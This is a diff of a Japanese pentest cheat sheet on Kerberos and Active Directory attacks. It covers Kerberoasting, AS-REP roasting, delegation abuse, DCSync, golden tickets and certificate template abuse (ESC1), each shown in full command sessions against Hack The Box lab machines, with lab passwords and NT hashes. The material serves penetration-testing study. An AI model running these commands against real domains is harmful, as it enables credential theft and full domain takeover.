@@ -1,69 +1,74 @@
 # Description
-----
+
+---
+
 ## Basics
 
 ![Kerberos101](images/Kerberos101.png)
 
-* 事前認証はActive Directoryではデフォルトで有効
-* TGTは、認証クライアントであるユーザアカウントのパスワードハッシュで暗号化される
-* サービスは必ずSPNでアカウントに紐付けられる。
-* サービスがユーザアカウントに紐付けられているTGSは、前記ユーザアカウントのパスワードハッシュで暗号化される
-* 詳細は[Kerberos (I): How does Kerberos work?](https://www.tarlogic.com/en/blog/how-kerberos-works/)を参照
+- 事前認証は Active Directory ではデフォルトで有効
+- TGT は、認証クライアントであるユーザアカウントのパスワードハッシュで暗号化される
+- サービスは必ず SPN でアカウントに紐付けられる。
+- サービスがユーザアカウントに紐付けられている TGS は、前記ユーザアカウントのパスワードハッシュで暗号化される
+- 詳細は[Kerberos (I): How does Kerberos work?](https://www.tarlogic.com/en/blog/how-kerberos-works/)を参照
 
 ## Unconstrained Delegation
-* [Kerberos (III): How does delegation work?](https://www.tarlogic.com/blog/kerberos-iii-how-does-delegation-work/)
+
+- [Kerberos (III): How does delegation work?](https://www.tarlogic.com/blog/kerberos-iii-how-does-delegation-work/)
 
 ![Unconstrained](images/Unconstrained.png)
 
-* ポイントは、AP ServerZにUser1のTGTが送信される点
-* AP ServerZはドメインコントローラのUserZアカウントのSPNで指定されている
-* UserZアカウントを侵害することができれば、SPNを書き換えることができる
-* すなわち、SPNを攻撃者サーバに変更することで、攻撃者サーバがAP ServerZになりすますことができる
-* したがって、攻撃者サーバではUser1のTGTを入手することが可能となる
-* また、PrintBugなどを利用すると、任意のユーザにAp ServerZ(になりすました攻撃者サーバ)との認証を行わせることができる
-* これにより、例えばAdminのTGTを入手することが可能となる
-
+- ポイントは、AP ServerZ に User1 の TGT が送信される点
+- AP ServerZ はドメインコントローラの UserZ アカウントの SPN で指定されている
+- UserZ アカウントを侵害することができれば、SPN を書き換えることができる
+- すなわち、SPN を攻撃者サーバに変更することで、攻撃者サーバが AP ServerZ になりすますことができる
+- したがって、攻撃者サーバでは User1 の TGT を入手することが可能となる
+- また、PrintBug などを利用すると、任意のユーザに Ap ServerZ(になりすました攻撃者サーバ)との認証を行わせることができる
+- これにより、例えば Admin の TGT を入手することが可能となる
 
 ## Constrained Delegation
-* [Kerberos (III): How does delegation work?](https://www.tarlogic.com/blog/kerberos-iii-how-does-delegation-work/)
-![Constrained_S4U2Proxy](images/Constrained_S4U2Proxy.png)
-* S4U2Proxyのポイントは、ServiceZのUser1のTGSから、msDS-AllowedToDelegationToで指定されたServiceXのUser1のTGSを生成可能な点
+
+- [Kerberos (III): How does delegation work?](https://www.tarlogic.com/blog/kerberos-iii-how-does-delegation-work/)
+  ![Constrained_S4U2Proxy](images/Constrained_S4U2Proxy.png)
+- S4U2Proxy のポイントは、ServiceZ の User1 の TGS から、msDS-AllowedToDelegationTo で指定された ServiceX の User1 の TGS を生成可能な点
 
 ![Constrained_S4U2Self](images/Constrained_S4U2Self.png)
 
-* S4U2Selfのポイントは、UserZのTGTから、ServiceZの任意のユーザ(例ではUser1)のTGSを生成可能な点
-* したがって、ドメインコントローラのUserZアカウントを侵害することができれば、UserZのTGTを入手できるため、S4U2Seflを利用し、ServiceZの任意のユーザのTGSを入手できる
-* 更に、S4U2Proxyを利用し、ServiceZの任意のユーザ(例えばAdmin)のTGSから、msDS-AllowedToDelegationToで指定されたServiceXの任意のユーザのTGSを入手できる
+- S4U2Self のポイントは、UserZ の TGT から、ServiceZ の任意のユーザ(例では User1)の TGS を生成可能な点
+- したがって、ドメインコントローラの UserZ アカウントを侵害することができれば、UserZ の TGT を入手できるため、S4U2Sefl を利用し、ServiceZ の任意のユーザの TGS を入手できる
+- 更に、S4U2Proxy を利用し、ServiceZ の任意のユーザ(例えば Admin)の TGS から、msDS-AllowedToDelegationTo で指定された ServiceX の任意のユーザの TGS を入手できる
 
 ![Constrained_ServiceName](images/Constrained_ServiceName.png)
 
-* 更にはサービス名は、TGSのクリアテキストに記載されており、変更可能
-  * ホスト名は変更できないことに注意
-* したがって、msDS-AllowedToDelegationToで指定されたServiceXの任意のユーザのTGSから、msDS-AllowedToDelegationToで指定されたServiceXが稼働するホストの、任意のサービスの任意のユーザのTGSを入手できる
+- 更にはサービス名は、TGS のクリアテキストに記載されており、変更可能
+  - ホスト名は変更できないことに注意
+- したがって、msDS-AllowedToDelegationTo で指定された ServiceX の任意のユーザの TGS から、msDS-AllowedToDelegationTo で指定された ServiceX が稼働するホストの、任意のサービスの任意のユーザの TGS を入手できる
 
 # Attack
-----
+
+---
 
 ## Pre-Auth Bruteforce
-* 事前認証を悪用し、ユーザを列挙
-* Tool: [kerbrute](https://github.com/ropnop/kerbrute)
-* HTB: Sauna 
+
+- 事前認証を悪用し、ユーザを列挙
+- Tool: [kerbrute](https://github.com/ropnop/kerbrute)
+- HTB: Sauna
 
   ```console
   ┌─[✗]─[rio@parrot]─[~/Htb/Sauna]
-  └──╼ $kerbrute userenum -d egotistical-bank.local --dc egotistical-bank.local users.txt 
-  
-      __             __               __     
-     / /_____  _____/ /_  _______  __/ /____ 
+  └──╼ $kerbrute userenum -d egotistical-bank.local --dc egotistical-bank.local users.txt
+
+      __             __               __
+     / /_____  _____/ /_  _______  __/ /____
     / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
    / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
-  /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
-  
+  /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
   Version: v1.0.3 (9dad6e1) - 07/14/21 - Ronnie Flathers @ropnop
-  
+
   2021/07/14 10:49:06 >  Using KDC(s):
   2021/07/14 10:49:06 >   egotistical-bank.local:88
-  
+
   2021/07/14 10:49:06 >  [+] VALID USERNAME:       administrator@egotistical-bank.local
   2021/07/14 10:49:06 >  [+] VALID USERNAME:       fsmith@egotistical-bank.local
   2021/07/14 10:49:12 >  [+] VALID USERNAME:       hsmith@egotistical-bank.local
@@ -71,14 +76,15 @@
   ```
 
 ## AS-REP Roasting
-* 事前認証が有効でないユーザのAS-REPを取得
-* HTB: Forest
+
+- 事前認証が有効でないユーザの AS-REP を取得
+- HTB: Forest
 
   ```console
   ┌─[rio@parrot]─[~/Htb/Forest]
   └──╼ $impacket-GetADUsers -dc-ip forest.htb -all htb.local/
   Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-  
+
   [*] Querying forest.htb for information about domain.
   Name                  Email                           PasswordLastSet      LastLogon
   --------------------  ------------------------------  -------------------  -------------------
@@ -149,7 +155,7 @@
   ┌─[rio@parrot]─[~/Htb/Forest]
   └──╼ $impacket-GetNPUsers -dc-ip forest.htb htb.local/ -no-pass -usersfile users.txt
   Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-  
+
   [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
   [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
   [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
@@ -184,10 +190,11 @@
   ```
 
 ## Kerberoasting
-* ユーザに紐付けられたサービスのTGSを取得する
-* ユーザーまたはコンピューターがKerberosを使用し（例えば）SMB経由でホストに認証する場合、Windowsはサービスチケットの要求をドメインコントローラーに送信する。この要求には、プロトコルとサービスが存在するホストから構成されるサービスプリンシパル名（SPN）が含まれる。ドメインコントローラーは、前記SPNが割り当てられているアカウントのディレクトリでルックアップし、発見したアカウントに関連付けられているKerberosキーを使用してサービスチケットを暗号化する。前記Kerberosキーは、発見したアカウントのパスワードから生成される。
-* servicePrincipalNameを有するユーザが攻撃対象
-* HTB: Active
+
+- ユーザに紐付けられたサービスの TGS を取得する
+- ユーザーまたはコンピューターが Kerberos を使用し（例えば）SMB 経由でホストに認証する場合、Windows はサービスチケットの要求をドメインコントローラーに送信する。この要求には、プロトコルとサービスが存在するホストから構成されるサービスプリンシパル名（SPN）が含まれる。ドメインコントローラーは、前記 SPN が割り当てられているアカウントのディレクトリでルックアップし、発見したアカウントに関連付けられている Kerberos キーを使用してサービスチケットを暗号化する。前記 Kerberos キーは、発見したアカウントのパスワードから生成される。
+- servicePrincipalName を有するユーザが攻撃対象
+- HTB: Active
 
   ```console
   ┌─[rio@parrot]─[~/Htb/Active]
@@ -199,7 +206,7 @@
   # filter: (objectclass=*)
   # requesting: ALL
   #
-  
+
   # Administrator, Users, active.htb
   dn: CN=Administrator,CN=Users,DC=active,DC=htb
   objectClass: top
@@ -247,41 +254,43 @@
   dSCorePropagationData: 16010101000000.0Z
   lastLogonTimestamp: 132557188237237831
   msDS-SupportedEncryptionTypes: 0
-  
+
   # search result
   search: 2
   result: 0 Success
-  
+
   # numResponses: 2
   # numEntries: 1
   ┌─[rio@parrot]─[~/Htb/Active]
   └──╼ $impacket-GetUserSPNs -dc-ip active.htb active.htb/SVC_TGS -request
   Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-  
+
   Password:
   ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
   --------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
   active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 04:06:40.351723  2021-01-22 17:42:30.615553
-  
-  
-  
+
+
+
   $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$34cdd5b77a82e3cf3f877e9eb44be9db$e57eb7b644bf4a8d12ff4960fc16445b88caf8bc2cceec0fd24c9eeb7650950c0ba9e3f516e9755dbbd08ff350c39ce6bce55f8d4db67261870d30f07edc495cf104bfc74e8e7d6e172d5bcbb98eb7390d31722acdcffe6cc249c8ef8ce7a89506abc45d31922fd7dd6c380dbc6370c7432bb06f487e2f97dd12df40c7327048174f8c7781a0d91f951b318d56b79cc2eadb3a9d65229c3e497256fc3bfe1f3c86440fb9841f03a8298faefce530e90cb752d47c92285ec9ca1e9c3ebe64f6b5c94876d5cde282d6091b290ba26a5cad530fd76c49179cc16e520a466adf87dfdfb671105080aa20ab4dd36d88acac0ba92926b107e1597ef7a124347c82cb2332bfa928ab83002dd6102e9ae39185d72adc1070dc9ecfbf15af5c4c980b8a4c10c67d0b1bd1ea807dfeb00e3703ee60cc7a774a686634f96ac5cf34873a69b11e91bb15776919801676b422d170563eac9b83c69ee919d4610fa8441d9dfb032e1d86360ff0fb00b3a872080e314d3aff2b2c43a7294989fe69a0743e1093182e62eae77e42a3d7caf47d35918ec79a4e1eafabb034f771cf9656dbfb0ffb80e1bce0ccd100defcfe2f8f79362aa3a5650a87537d2daa5d182f0f373609f760a60f727ed2980c99219b7741e45b486a148d556b6a766bb81cde54dbcaaf551aa2faf6e5c967771f6aae29e725bbcd6f4ae7be2afec5bec7e61cc754ea3ca133ffb991ea196778e9add0bbe5b687e64cdd09276e45a57ac9327bfc65a13a693c1dda029922623fe602454f4308e954f080efe627d349890aa40c96fde88ea8271aebc1c9da812a4aef10d6675fa93aedc17c0fc873a1d1c8134bd41ba156c64d73a400c6af652aa0956e13a1c0b642b0d1b6ceebe7e775818445aea3cfe97a2ab62d624f0f272f0e4008184bad4b61343b755725b82e76c92d7bbc05f17790293e6ad8353b7eea3e8a2d7161e43d1ad00a248363e5ec8226bb4d770a5a33f51dc722fc3a5fad3a5ded48c4cbc0eef11331d434cc4ce655ba4e82865f08afbfa09888ec526e1d99315047cddc95b3f18c3f514749daa6138a88fe7dc84d69fd2a23faeb36d76323d2683ca7a0122cdb3a9ac3aff9ab2ee94836c87de1b22c30b4c4de45091d49819aa450daba9b69541bcc81eae93d6f6c2e4aa074998cdbc8bc4b764b55df3aee3dd01961d54a4ff2b264d2539c578966b4a862a7996e0bb78c829b844dbc4927f12d5d5ed1db3b6beaee62abfde8e432ed3ed8
-  
+
   ```
 
 ## Unconstrained Delegation Attack
-* 制約のない委任が許可されている時、侵害したアカウントのSPNを攻撃者サーバに改ざんすることで、前記SPNのTGSを要求したユーザのTGTを取得可能
-* ldapのuserAccountControlプロパティに**TRUSTED_FOR_DELEGATION**フラグが設定されているアカウントが攻撃対象
-* [krbrelayx/krbrelayx](https://github.com/dirkjanm/krbrelayx)を利用し、ユーザから送信されたTGTを受信する攻撃者サーバを構築
-  * 高権限を有するユーザがドメインコントローラに特定のSPN（この場合は改ざんしたSPN）のTGSを要求するよう、攻撃者はPrinterBugやPrivExecの脆弱性を利用する必要がある
-* 詳細は[“Relaying” Kerberos - Having fun with unconstrained delegation](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)を参照
+
+- 制約のない委任が許可されている時、侵害したアカウントの SPN を攻撃者サーバに改ざんすることで、前記 SPN の TGS を要求したユーザの TGT を取得可能
+- ldap の userAccountControl プロパティに**TRUSTED_FOR_DELEGATION**フラグが設定されているアカウントが攻撃対象
+- [krbrelayx/krbrelayx](https://github.com/dirkjanm/krbrelayx)を利用し、ユーザから送信された TGT を受信する攻撃者サーバを構築
+  - 高権限を有するユーザがドメインコントローラに特定の SPN（この場合は改ざんした SPN）の TGS を要求するよう、攻撃者は PrinterBug や PrivExec の脆弱性を利用する必要がある
+- 詳細は[“Relaying” Kerberos - Having fun with unconstrained delegation](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)を参照
 
 ## Constrained Delegation Attack
-* 制約付き委任が許可されている時、任意のユーザに成りすまして**msDS-AllowedToDelegateTo**が示すホストの任意のサービスのTGSを取得可能
-  * リソースベースの制約付き委任が許可されている時は、**msDS-AllowedToActOnBehalfOfOtherIdentity**プロパティを有するサービスが示すホストの任意のユーザかつ任意のサービスのTGSが取得可能
-* ldapのuserAccountControlプロパティに**TRUSTED_TO_AUTH_FOR_DELEGATION**フラグが設定されているアカウントが攻撃対象
-* 詳細は[Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)を参照
-* HTB: Intelligence
+
+- 制約付き委任が許可されている時、任意のユーザに成りすまして**msDS-AllowedToDelegateTo**が示すホストの任意のサービスの TGS を取得可能
+  - リソースベースの制約付き委任が許可されている時は、**msDS-AllowedToActOnBehalfOfOtherIdentity**プロパティを有するサービスが示すホストの任意のユーザかつ任意のサービスの TGS が取得可能
+- ldap の userAccountControl プロパティに**TRUSTED_TO_AUTH_FOR_DELEGATION**フラグが設定されているアカウントが攻撃対象
+- 詳細は[Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)を参照
+- HTB: Intelligence
 
   ```console
   ┌─[rio@parrot]─[~/Htb/Intelligence]
@@ -322,7 +331,7 @@
   usncreated:                     12846
   whenchanged:                    2021-06-30 00:56:22
   whencreated:                    2021-04-19 00:49:58
-  
+
   ┌─[rio@parrot]─[~/Htb/Intelligence]
   └──╼ $ldapsearch -x -D ted.graves@intelligence.htb -w Mr.Teddy -h intelligence.htb -b 'dc=intelligence,dc=htb' name=svc_int
   # extended LDIF
@@ -332,7 +341,7 @@
   # filter: name=svc_int
   # requesting: ALL
   #
-  
+
   # svc_int, Managed Service Accounts, intelligence.htb
   dn: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
   objectClass: top
@@ -384,30 +393,30 @@
   msDS-GroupMSAMembership:: AQAEgBQAAAAAAAAAAAAAACQAAAABAgAAAAAABSAAAAAgAgAABABQ
    AAIAAAAAACQA/wEPAAEFAAAAAAAFFQAAAEaG8fp0Fw3KRmPkzOgDAAAAACQA/wEPAAEFAAAAAAAFF
    QAAAEaG8fp0Fw3KRmPkzHYEAAA=
-  
+
   # search reference
   ref: ldap://ForestDnsZones.intelligence.htb/DC=ForestDnsZones,DC=intelligence,
    DC=htb
-  
+
   # search reference
   ref: ldap://DomainDnsZones.intelligence.htb/DC=DomainDnsZones,DC=intelligence,
    DC=htb
-  
+
   # search reference
   ref: ldap://intelligence.htb/CN=Configuration,DC=intelligence,DC=htb
-  
+
   # search result
   search: 2
   result: 0 Success
-  
+
   # numResponses: 5
   # numEntries: 1
   # numReferences: 3
-  
+
   ┌─[rio@parrot]─[~/Htb/Intelligence]
   └──╼ $impacket-getST -dc-ip intelligence.htb -spn WWW/dc.intelligence.htb -impersonate Administrator -hashes :d64b83fe606e6d3005e20ce0ee932fe2 intelligence.htb/svc_int
   Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-  
+
   [*] Getting TGT for user
   [*] Impersonating Administrator
   [*]     Requesting S4U2self
@@ -418,7 +427,7 @@
   ┌─[rio@parrot]─[~/Htb/Intelligence]
   └──╼ $impacket-psexec -k -no-pass intelligence.htb/administrator@dc.intelligence.htb
   Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-  
+
   [*] Requesting shares on dc.intelligence.htb.....
   [*] Found writable share ADMIN$
   [*] Uploading file FzYxsMAE.exe
@@ -428,34 +437,35 @@
   [!] Press help for extra shell commands
   Microsoft Windows [Version 10.0.17763.1879]
   (c) 2018 Microsoft Corporation. All rights reserved.
-  
+
   C:\Windows\system32>whoami
   nt authority\system
   ```
 
 ## DCSync
-* Active Directory間のntds.ditの同期機能を悪用し、ntds.ditを取得
-* 状況如何では侵入したホストでユーザにDCSync権限（ExtendedRight）の付与が必要
-  * 詳細は[Abusing Active Directory Permissions with PowerView](http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/)を参照
-* なお、NTLMRelayxのescalate-userオプションでも、DCSync権限の付与が可能
-  * NTLMをhttpからldapへリレーし、ユーザにDCSync権限を付与
-  * 詳細は[Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)を参照
-* secretsdumpでntds.ditを取得
-* HTB: Forest
+
+- Active Directory 間の ntds.dit の同期機能を悪用し、ntds.dit を取得
+- 状況如何では侵入したホストでユーザに DCSync 権限（ExtendedRight）の付与が必要
+  - 詳細は[Abusing Active Directory Permissions with PowerView](http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/)を参照
+- なお、NTLMRelayx の escalate-user オプションでも、DCSync 権限の付与が可能
+  - NTLM を http から ldap へリレーし、ユーザに DCSync 権限を付与
+  - 詳細は[Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)を参照
+- secretsdump で ntds.dit を取得
+- HTB: Forest
 
   ```console
   侵入したホストで必要であればDCSync権限をユーザに付与
-  
+
   C:\Users\svc-alfresco\Documents> $pass = convertto-securestring "password" -asplain -force
   C:\Users\svc-alfresco\Documents> $cred = new-object system.management.automation.pscredential("htb\new_user", $pass)
   C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity new_user -Credential $cred -Rights DCSync
-  
+
   Hostマシンで実行
-  
+
   ┌─[rio@parrot]─[~/Htb/Forest]
   └──╼ $impacket-secretsdump -dc-ip forest.htb htb.local/new_user:password@forest.htb
   Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-  
+
   [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
   [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
   [*] Using the DRSUAPI method to get NTDS.DIT secrets
@@ -568,12 +578,12 @@
   [*] Cleaning up...
   ```
 
-
 ## Golden Ticket
-* ntds.ditなどから漏洩したkrbtgtのパスワードハッシュから、新規ユーザのGolden Tichketを生成
-* 前記Golden Ticketを利用し、psexecなどでターゲットへ侵入可能
-* DomainのSIDはターゲット上でGet-ADDomainを実行する、もしくはrpcclientで適当なユーザのlookupnamesを実行し、取得すればよい
-* HTB: Forest
+
+- ntds.dit などから漏洩した krbtgt のパスワードハッシュから、新規ユーザの Golden Tichket を生成
+- 前記 Golden Ticket を利用し、psexec などでターゲットへ侵入可能
+- Domain の SID はターゲット上で Get-ADDomain を実行する、もしくは rpcclient で適当なユーザの lookupnames を実行し、取得すればよい
+- HTB: Forest
 
   ```console
   ┌─[rio@parrot]─[~/Htb/Forest]
@@ -585,7 +595,7 @@
   ┌─[✗]─[rio@parrot]─[~/Htb/Forest]
   └──╼ $impacket-ticketer -domain htb.local -domain-sid S-1-5-21-3072663084-364016917-1341370565 -nthash 819af826bb148e603acb0f33d17632f8 new_user
   Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-  
+
   [*] Creating basic skeleton ticket and PAC Infos
   [*] Customizing ticket for htb.local/new_user
   [*]     PAC_LOGON_INFO
@@ -600,12 +610,162 @@
   [*] Saving ticket in new_user.ccache
   ```
 
+## Certificate Template
+
+- Kerberos 認証では、証明書での認証が可能
+- 証明書テンプレートに誤設定が存在する場合、攻撃者は任意の証明書を入手できる場合がある
+- 入手した証明書で Kerberos 認証を行い、任意のユーザの TGT(ccache)もしくは HTLM ハッシュを入手する
+- tool: [certipy](https://github.com/ly4k/Certipy.git)
+- HTB: Escape
+
+```console
+╭╴(root@container) /work
+╰╴$ certipy find -vulnerable -stdout -u ryan.cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.12
+9.88.216
+Certipy v4.4.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'sequel-DC-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : sequel-DC-CA
+    DNS Name                            : dc.sequel.htb
+    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
+    Certificate Validity End            : 2121-11-18 21:08:46+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : UserAuthentication
+    Display Name                        : UserAuthentication
+    Certificate Authorities             : sequel-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 10 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Domain Users
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Administrator
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+        Write Property Principals       : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+    [!] Vulnerabilities
+      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
+
+╭╴(root@container) /work
+╰╴$ certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -target 10.129.88.216 -template UserAuthentication -ca sequel-DC-CA -upn Administrator@sequel.htb
+Certipy v4.4.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 13
+[*] Got certificate with UPN 'Administrator@sequel.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+
+╭╴(root@container) /work
+╰╴$ certipy auth -pfx administrator.pfx -dc-ip 10.129.88.216
+Certipy v4.4.0 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@sequel.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
+
+╭╴(root@container) /work
+╰╴$ klist administrator.ccache
+Ticket cache: FILE:administrator.ccache
+Default principal: administrator@SEQUEL.HTB
+
+Valid starting     Expires            Service principal
+06/06/23 20:03:29  06/07/23 06:03:29  krbtgt/SEQUEL.HTB@SEQUEL.HTB
+        renew until 06/07/23 20:03:28
+
+╭╴(root@container) /work
+╰╴$ impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee' -no-pass administrator@10.129.88.216
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 10.129.88.216.....
+[*] Found writable share ADMIN$
+[*] Uploading file yRLPuZBs.exe
+[*] Opening SVCManager on 10.129.88.216.....
+[*] Creating service VKyr on 10.129.88.216.....
+[*] Starting service VKyr.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+
+
+```
+
+# Tools
+
+| tool     | in/out                                                          | attack               |
+| -------- | --------------------------------------------------------------- | -------------------- |
+| ticketer | krbtgt's NTLM -> any user's TGT                                 | golden ticket        |
+| getST    | user's NTLM / password -> user's TGT -> impersonated user's TGS | deligation           |
+| getTGT   | user's NTLM / password -> user's TGT                            | over the hash        |
+| certipy  | AD CS cert -> user's TGT / NTLM                                 | certificate template |
+
 # Others
+
 ---
 
-##  Error: Clock skew too great
-* Kerberosクライアントとサーバ間で時刻同期ができていないことが原因
-* Active Directoryでntpサーバが動作している場合は、`ntpdate`で調整可能
+## Error: Clock skew too great
+
+- Kerberos クライアントとサーバ間で時刻同期ができていないことが原因
+- Active Directory で ntp サーバが動作している場合は、`ntpdate`で調整可能
 
   ```console
   ┌─[rio@parrot]─[~/Htb/Intelligence]
@@ -614,8 +774,8 @@
   └──╼ $sudo ntpdate intelligence.htb
   14 Jul 21:49:49 ntpdate[23751]: step time server 10.129.183.59 offset +25200.373168 sec
   ```
-  
-* Active Directoryでsmbサーバが動作している場合は、`date`で調整可能
+
+- Active Directory で smb サーバが動作している場合は、`date`で調整可能
 
   ```console
   ┌─[rio@parrot]─[~/Htb/Forest]
@@ -623,15 +783,15 @@
   Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-14 17:10 JST
   Nmap scan report for forest.htb (10.129.183.66)
   Host is up (0.28s latency).
-  
+
   PORT    STATE SERVICE
   445/tcp open  microsoft-ds
-  
+
   Host script results:
   | smb2-time:
   |   date: 2021-07-14T08:10:29
   |_  start_date: 2021-07-14T07:13:13
-  
+
   Nmap done: 1 IP address (1 host up) scanned in 4.41 seconds
   ┌─[rio@parrot]─[~/Htb/Forest]
   └──╼ $sudo date -s '2021-07-14T08:10:04 GMT'
@@ -639,7 +799,8 @@
   ```
 
 ## Reference
-----
 
-* [Penetration Testing Active Directory, Part II](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
-* [No Shells Required - a Walkthrough on Using Impacket and Kerberos to Delegate Your Way to DA](http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)
+---
+
+- [Penetration Testing Active Directory, Part II](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
+- [No Shells Required - a Walkthrough on Using Impacket and Kerberos to Delegate Your Way to DA](http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)
